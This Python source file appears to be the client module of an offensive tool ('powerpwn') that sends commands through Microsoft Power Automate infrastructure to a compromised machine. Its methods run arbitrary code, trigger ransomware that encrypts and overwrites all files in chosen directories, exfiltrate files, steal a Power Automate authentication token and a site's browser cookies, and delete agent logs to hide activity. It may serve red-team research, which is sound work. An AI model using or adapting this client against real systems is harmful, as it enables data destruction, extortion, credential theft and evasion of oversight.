import json
from typing import List

import requests
from pydantic.error_wrappers import ValidationError

from powerpwn.machinepwn.enums.code_exec_type_enum import CodeExecTypeEnum
from powerpwn.machinepwn.models.any_command_args import AnyCommandArgs
from powerpwn.machinepwn.models.cleanup_command_args import CleanupCommandArgs
from powerpwn.machinepwn.models.cmd_results import CommandResults
from powerpwn.machinepwn.models.code_exec_args_properties import CodeExecArgsProperties
from powerpwn.machinepwn.models.code_exec_command_args import CodeExecCommandArgs
from powerpwn.machinepwn.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
from powerpwn.machinepwn.models.exflirtate_file_args_properties import ExflirtateFileArgsProperties
from powerpwn.machinepwn.models.exflirtate_file_command_args import ExflirtateFileCommandArgs
from powerpwn.machinepwn.models.ransomware_args_properties import RansomwareArgsProperties
from powerpwn.machinepwn.models.ransomware_command_args import RansomwareCommandArgs
from powerpwn.machinepwn.models.steal_cookie_args_properties import StealCookieArgsProperties
from powerpwn.machinepwn.models.steal_cookie_command_args import StealCookieCommandArgs
from powerpwn.machinepwn.models.steal_power_automate_token_command_args import StealPowerAutomateTokenCommandArgs


class MachinePwn:
    def __init__(self, post_url: str, debug: bool = False):
        """
        Power Pwn client to run commands through Microsoft infrastructure
        :param post_url: a URL on the malicious Microsoft instance to post commands to
        :param debug: whether to print debug messages
        """
        self.post_url = post_url
        self.debug = debug

    def run_cmd(self, arguments: AnyCommandArgs) -> CommandResults:
        if self.debug:
            print(f"Raw command: {arguments.__root__}")

        try:
            cmd_args = json.loads(arguments.__root__.json())
        except json.JSONDecodeError:
            print(f"Bad command. Raw content: {arguments}")
            raise

        results = self._run_cmd(arguments_as_dict=cmd_args)
        
        if "error" in results:
            cmd_res=CommandResults(is_success=False, error_message=results["error"]["message"])
        else:
            cmd_res = CommandResults.parse_obj(results)
        return cmd_res

    def _run_cmd(self, arguments_as_dict: dict) -> dict:  # type: ignore
        # noinspection PyTypeChecker
        resp = requests.post(url=self.post_url, json=arguments_as_dict)  # nosec

        if self.debug:
            print(f"Raw content: {resp.content.decode('utf8')}")

        try:
            return resp.json()
        except ValidationError:
            print(f"Bad response. Raw content: {resp.content.decode('utf8')}")
            raise

    def exec_command(self, command: str, command_type: CodeExecTypeEnum) -> CommandResults:
        props = CodeExecArgsProperties(code_exec_command_type=command_type, code_exec_command=command)
        flow_args = AnyCommandArgs.parse_obj(CodeExecCommandArgs(command_properties=props))  # type: ignore[arg-type]
        return self.run_cmd(flow_args)

    def ransomware(self, crawl_depth: str, dirs_to_init_crawl: List[str], encryption_key: str) -> CommandResults:
        """
        Overwrite all files in dirs_to_init_crawl with an encrypted version
        :param crawl_depth: recursively search into subdirectories this many times
        :param dirs_to_init_crawl: a list of directories to begin crawl from separated by a command (e.g.'C:\\,D:\\')
        :param encryption_key: an encryption key used to encrypt each file identified (AES256)
        :return: command results
        """
        dirs_to_init_crawl_str = ",".join(dirs_to_init_crawl)
        props = RansomwareArgsProperties(
            ransomware_crawl_depth=crawl_depth, ransomware_directories_to_init_crawl=dirs_to_init_crawl_str, ransomware_encryption_key=encryption_key
        )
        flow_args = AnyCommandArgs.parse_obj(RansomwareCommandArgs(command_properties=props))  # type: ignore[arg-type] # known bug: https://github.com/python/mypy/issues/13421
        return self.run_cmd(flow_args)

    def exfiltrate(self, target_file_path: str) -> CommandResults:
        """
        Exfiltrate file from victim machine
        :param target_file_path: absolute path to file
        :return: command results
        """
        props = ExflirtateFileArgsProperties(exfiltrate_target_file=target_file_path)
        flow_args = AnyCommandArgs.parse_obj(ExflirtateFileCommandArgs(command_properties=props))  # type: ignore[arg-type]
        return self.run_cmd(flow_args)

    def cleanup(self) -> CommandResults:
        """
        Delete agent log files
        :return: command results
        """

        flow_args = AnyCommandArgs.parse_obj(CleanupCommandArgs(command_properties=CommandArgsPropertiesBaseModel()))  # type: ignore[arg-type]
        return self.run_cmd(flow_args)

    def steal_power_automate_token(self) -> CommandResults:
        """
        Open a browser, go to the Power Automate website and steal the authentication token
        :return: command results
        """
        flow_args = AnyCommandArgs.parse_obj(StealPowerAutomateTokenCommandArgs(command_properties=CommandArgsPropertiesBaseModel()))  # type: ignore[arg-type]
        return self.run_cmd(flow_args)

    def steal_cookie(self, fqdn: str) -> CommandResults:
        """
        Open a browser, go to the FQDN and seal its cookies
        :param fqdn: fully qualified domain name to fetch the cookies of
        :return: command results
        """
        props = StealCookieArgsProperties(steal_cookie_fqdn=fqdn)
        flow_args = AnyCommandArgs.parse_obj(StealCookieCommandArgs(command_properties=props))  # type: ignore[arg-type]
        return self.run_cmd(flow_args)
